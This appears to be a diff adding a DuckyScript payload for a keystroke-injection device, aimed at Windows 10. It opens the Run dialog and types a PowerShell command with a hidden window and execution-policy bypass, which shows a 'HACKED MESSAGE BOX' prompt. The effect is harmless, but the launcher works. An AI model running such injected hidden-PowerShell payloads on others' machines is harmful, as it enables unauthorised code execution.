@@ -1,0 +1,15 @@
+REM Title: System Message
+REM Author: @beigeworm
+REM Description: This will open a Message prompt on the Target.
+REM Target: Windows 10
+
+REM =============================================================================
+
+REM some setup for dukie script.
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window)
+GUI r
+DELAY 750
+STRING powershell -W Hidden -Exec Bypass -C "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('HACKED MESSAGE BOX')"
+ENTER
